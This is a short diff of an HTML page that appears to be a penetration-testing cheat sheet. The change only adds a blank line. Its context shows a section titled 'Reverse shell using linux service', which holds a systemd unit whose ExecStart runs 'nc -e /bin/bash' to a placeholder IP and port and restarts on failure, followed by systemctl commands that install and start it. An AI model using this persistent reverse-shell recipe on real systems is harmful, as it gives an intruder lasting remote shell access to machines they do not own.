@@ -113,6 +113,7 @@ layout: default
     <br>
 
     <h4>Reverse shell using linux service</h4>
+    
     <pre>&#13;&#10;[Service]&#13;&#10;Type=notify&#13;&#10;ExecStart=/bin/bash -c &apos;nc -e /bin/bash &lt;ip address&gt; &lt;port&gt;&apos;&#13;&#10;KillMode=process&#13;&#10;Restart=on-failure&#13;&#10;RestartSec=40s&#13;&#10;[Install]&#13;&#10;WantedBy=multi-user.target&#13;&#10;&#13;&#10;&#13;&#10;systemctl link &lt;.service file&gt;&#13;&#10;systemctl start &lt;service&gt;&#13;&#10;    </pre>
 
     <hr>
